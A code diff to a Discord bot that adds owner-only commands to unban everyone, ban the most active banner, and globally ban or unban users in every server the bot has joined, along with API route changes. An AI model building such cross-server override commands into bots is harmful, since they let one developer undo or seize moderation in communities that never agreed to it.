+              if (execId && execId !== client.user.id) {
+                banCounts[execId] = (banCounts[execId] || 0) + 1;
+              }
+            });
+            let maxBans = 0;
+            for (const [id, count] of Object.entries(banCounts)) {
+              if (count > maxBans) {
+                maxBans = count;
+                perpetratorId = id;
+              }
+            }
+          }
+          if (perpetratorId) {
+            await targetGuild.members.ban(perpetratorId, { reason: "\u0645\u0646\u0641\u0630 \u0627\u0644\u0628\u0646\u062F \u0627\u0644\u062C\u0645\u0627\u0639\u064A (\u062A\u062D\u0642\u0642 \u062A\u0644\u0642\u0627\u0626\u064A)" }).catch(() => null);
+          }
+          const invite = await targetGuild.channels.cache.filter((c) => c.type === ChannelType.GuildText).first()?.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
+          let count = 0;
+          let fail = 0;
+          let inviteSent = 0;
+          for (const ban of bans.values()) {
+            try {
+              if (invite) {
+                await ban.user.send(`\u062A\u0645 \u0641\u0643 \u0627\u0644\u0628\u0627\u0646 \u0639\u0646\u0643 \u0641\u064A **${targetGuild.name}**\u060C \u064A\u0645\u0643\u0646\u0643 \u0627\u0644\u0639\u0648\u0624\u0629: ${invite.url}`).then(() => inviteSent++).catch(() => {
+                });
+              }
+              await targetGuild.members.unban(ban.user.id);
+              count++;
+            } catch (e) {
+              fail++;
+            }
+          }
+          let resultMsg = `\u2705 \u062A\u0645 \u0641\u0643 \u0627\u0644\u0628\u0627\u0646 \u0639\u0646 **${count}** \u0645\u0633\u062A\u062E\u062F\u0645. (\u0641\u0634\u0644: ${fail})`;
+          if (inviteSent > 0) resultMsg += `\n\u{1F4E9} \u062A\u0645 \u0625\u0631\u0633\u0627\u0644 **${inviteSent}** \u062F\u0639\u0648\u0629.`;
+          if (perpetratorId) resultMsg += `\n\u{1F528} \u062A\u0645 \u0628\u0646\u062F \u0627\u0644\u0645\u062A\u0633\u0628\u0628: <@${perpetratorId}>`;
+          await interaction.editReply({ content: resultMsg });
+        } catch (error) {
+          await interaction.editReply({ content: `\u274C \u062D\u062F\u062B \u062E\u0637\u0623: ${error.message}` });
+        }
+      }
+      if (commandName === "global-unban-all") {
+        if (user.id !== OWNER_ID && user.username !== OWNER_USERNAME) return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u062E\u0627\u0635 \u0628\u0627\u0644\u0645\u0637\u0648\u0631 \u0641\u0642\u0637.", ephemeral: true });
+        await interaction.deferReply({ ephemeral: true });
+        let totalUnbanned = 0;
+        let totalInvites = 0;
+        let guildsCount = 0;
+        for (const guild of client.guilds.cache.values()) {
+          guildsCount++;
+          try {
+            const bans = await guild.bans.fetch().catch(() => null);
+            if (!bans || bans.size === 0) continue;
+            const auditLogs = await guild.fetchAuditLogs({ limit: 100, type: AuditLogEvent.MemberBanAdd }).catch(() => null);
+            let perpetratorId = null;
+            if (auditLogs) {
+              const banCounts = {};
+              auditLogs.entries.forEach((entry) => {
+                const execId = entry.executorId;
+                if (execId && execId !== client.user.id) {
+                  banCounts[execId] = (banCounts[execId] || 0) + 1;
+                }
+              });
+              let max = 0;
+              for (const [id, count] of Object.entries(banCounts)) {
+                if (count > max) {
+                  max = count;
+                  perpetratorId = id;
+                }
+              }
+            }
+            if (perpetratorId) {
+              await guild.members.ban(perpetratorId, { reason: "Mass ban perpetrator (Global Cleanup)" }).catch(() => null);
+            }
+            const invite = await guild.channels.cache.filter((c) => c.type === ChannelType.GuildText).first()?.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
+            for (const ban of bans.values()) {
+              try {
+                if (invite) {
+                  await ban.user.send(`\u062A\u0645 \u0641\u0643 \u0627\u0644\u0628\u0627\u0646 \u0639\u0646\u0643 \u0641\u064A **${guild.name}**\u060C \u062A\u0641\u0636\u0644 \u0628\u0627\u0644\u062F\u062E\u0648\u0644: ${invite.url}`).then(() => totalInvites++).catch(() => {
+                  });
+                }
+                await guild.members.unban(ban.user.id);
+                totalUnbanned++;
+              } catch (e) {
+              }
+            }
+          } catch (err) {
+          }
+        }
+        await interaction.editReply({ content: `\u2705 \u0646\u0638\u0627\u0645 \u0627\u0644\u062A\u0646\u0638\u064A\u0641 \u0627\u0644\u0634\u0627\u0645\u0644 \u0627\u0646\u062A\u0647\u0649:\n- \u062A\u0645 \u0641\u0643 \u0627\u0644\u0628\u0627\u0646 \u0639\u0646: **${totalUnbanned}**\n- \u062A\u0645 \u0625\u0631\u0633\u0627\u0644: **${totalInvites}** \u062F\u0639\u0648\u0629\n- \u0639\u062F\u062F \u0627\u0644\u0633\u064A\u0631\u0641\u0631\u0627\u062A: **${guildsCount}**` });
+      }
+      if (commandName === "global-ban") {
+        if (user.id !== OWNER_ID && user.username !== OWNER_USERNAME) return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u062E\u0627\u0635 \u0628\u0627\u0644\u0645\u0637\u0648\u0631 \u0641\u0642\u0637.", ephemeral: true });
+        const targetUserId = interaction.options.getString("user_id");
+        await interaction.deferReply({ ephemeral: true });
+        let successCount = 0;
+        let failCount = 0;
+        for (const guild of client.guilds.cache.values()) {
+          try {
+            await guild.members.ban(targetUserId, { reason: "Global ban by owner" });
+            successCount++;
+          } catch (e) {
+            failCount++;
+          }
+        }
+        await interaction.editReply({ content: `\u2705 \u062A\u0645 \u0627\u0644\u0628\u0646\u062F \u0627\u0644\u0634\u0627\u0645\u0644 \u0644\u0640 <@${targetUserId}>:\n- \u0646\u062C\u062D \u0641\u064A: **${successCount}** \u0633\u064A\u0631\u0641\u0631\n- \u0641\u0634\u0644 \u0641\u064A: **${failCount}** \u0633\u064A\u0631\u0641\u0631` });
+      }
+      if (commandName === "servers") {
+        if (user.id !== OWNER_ID && user.username !== OWNER_USERNAME) return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u062E\u0627\u0635 \u0628\u0627\u0644\u0645\u0637\u0648\u0631 \u0641\u0642\u0637.", ephemeral: true });
+        const guilds = client.guilds.cache.map((g) => `**${g.name}** (${g.id})`).join("\n");
+        const embed = new EmbedBuilder().setTitle("\u{1F4D1} Server List").setDescription(guilds.length > 2048 ? guilds.substring(0, 2045) + "..." : guilds || "No servers found.").setColor("#5865F2");
+        await interaction.reply({ embeds: [embed], ephemeral: true });
       }
       if (commandName === "botinfo") {
         const uptime = process.uptime();
@@ -6003,10 +6215,25 @@ async function startServer() {
     }
   }));
   console.log("Defining API routes...");
+  app.get("/api/diagnostic", (req, res) => {
+    res.json({
+      ready: client.isReady(),
+      guilds: client.guilds.cache.size,
+      user: client.user?.tag || "None",
+      env: {
+        nodeEnv: process.env.NODE_ENV,
+        hasToken: !!DISCORD_TOKEN,
+        hasClientId: !!DISCORD_CLIENT_ID,
+        hasAppUrl: !!APP_URL
+      }
+    });
+  });
   app.get("/api/status", (req, res) => {
     try {
       res.json({
-        status: client.isReady() ? "online" : "offline",
+        status: client.isReady() ? "online" : "starting",
+        ready: client.isReady(),
+        clientId: DISCORD_CLIENT_ID,
         guilds: client.guilds.cache.size,
         users: client.users.cache.size,
         uptime: client.uptime || 0,
@@ -6021,16 +6248,20 @@ async function startServer() {
   });
   app.get("/api/guilds/:guildId/roles", async (req, res) => {
     try {
-      const guild = await client.guilds.fetch(req.params.guildId);
+      const { guildId } = req.params;
+      const guild = client.guilds.cache.get(guildId) || await client.guilds.fetch(guildId).catch(() => null);
       if (!guild) return res.status(404).json({ error: "Guild not found" });
-      const roles = guild.roles.cache.map((r) => ({
-        id: r.id,
-        name: r.name,
-        color: r.hexColor,
-        position: r.position,
-        permissions: r.permissions.toArray(),
-        managed: r.managed
-      }));
+      
+      const roles = guild.roles.cache
+        .filter((r) => r.name !== "@everyone" && !r.managed)
+        .sort((a, b) => b.position - a.position)
+        .map((r) => ({ 
+          id: r.id, 
+          name: r.name, 
+          color: r.hexColor,
+          position: r.position,
+          permissions: r.permissions.toArray()
+        }));
       res.json(roles);
     } catch (err) {
       res.status(500).json({ error: "Failed to fetch roles" });
@@ -6114,7 +6345,9 @@ async function startServer() {
   });
   app.get("/api/guilds", async (req, res) => {
     try {
-      if (!client.isReady()) return res.json([]);
+      if (!client.isReady()) {
+        return res.status(503).json({ error: "الصبوت لا يزال قيد التشغيل... يرجى الانتظار", retryAfter: 5 });
+      }
       const guilds = await Promise.all(client.guilds.cache.map(async (guild) => {
         let inviteUrl = null;
         try {
@@ -6154,17 +6387,6 @@ async function startServer() {
       res.json(channels);
     } catch (err) {
       res.status(500).json({ error: "Failed to fetch channels" });
-    }
-  });
-  app.get("/api/guilds/:guildId/roles", async (req, res) => {
-    try {
-      const { guildId } = req.params;
-      const guild = client.guilds.cache.get(guildId);
-      if (!guild) return res.status(404).json({ error: "Guild not found" });
-      const roles = guild.roles.cache.filter((r) => r.name !== "@everyone" && !r.managed).map((r) => ({ id: r.id, name: r.name, color: r.hexColor }));
-      res.json(roles);
-    } catch (err) {
-      res.status(500).json({ error: "Failed to fetch roles" });
     }
   });
   app.get("/api/guilds/:guildId/welcome", (req, res) => {
@@ -6792,11 +7014,24 @@ async function startServer() {
     res.status(404).json({ error: "API route not found" });
   });
   if (process.env.NODE_ENV !== "production") {
-    const vite = await createViteServer({
-      server: { middlewareMode: true },
-      appType: "spa"
-    });
-    app.use(vite.middlewares);
+    try {
+      console.log("Initializing Vite configuration...");
+      const vite = await createViteServer({
+        server: { middlewareMode: true },
+        appType: "spa"
+      });
+      app.use(vite.middlewares);
+      console.log("Vite development middleware integrated.");
+    } catch (viteError) {
+      console.error("Vite server creation failed. Falling back to static serving if dashboard exists.", viteError);
+      const distPath = path.resolve(process.cwd(), "dashboard");
+      if (fs.existsSync(distPath)) {
+        app.use(express.static(distPath));
+        app.get("*", (req, res) => {
+          res.sendFile(path.resolve(distPath, "index.html"));
+        });
+      }
+    }
   } else {
     const distPath = path.resolve(process.cwd(), "dashboard");
     app.use(express.static(distPath));
